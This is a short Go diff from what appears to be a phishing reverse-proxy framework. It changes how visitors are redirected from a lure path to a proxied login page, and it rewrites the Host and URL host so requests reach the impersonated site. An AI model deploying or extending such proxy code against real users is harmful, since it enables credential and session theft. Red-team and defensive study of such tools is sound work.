@@ -600,17 +600,15 @@ func NewHttpProxy(hostname string, port int, http_port int, cfg *Config, crt_db 
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
-						// redirect from lure path to phishing login url
-						rurl := pl.GetPhishLoginUrl()
-						if rurl != "" {
-							u, err := url.Parse(rurl)
-							if err == nil {
-								if strings.ToLower(req_path) != strings.ToLower(u.Path) {
-									resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-									if resp != nil {
-										resp.Header.Add("Location", rurl)
-										return req, resp
-									}
+						// redirect from lure path to login url
+						rurl := pl.GetLoginUrl()
+						u, err := url.Parse(rurl)
+						if err == nil {
+							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
+								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+								if resp != nil {
+									resp.Header.Add("Location", rurl)
+									return req, resp
 								}
 							}
 						}
@@ -627,9 +625,10 @@ func NewHttpProxy(hostname string, port int, http_port int, cfg *Config, crt_db 
 					}
 				}
 
-				// replace "Host" header
+				// replace "Host" header and URL host for proper proxying
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
+					req.URL.Host = r_host
 				}
 
 				// Set correct scheme for connecting to origin server based on phishlet config
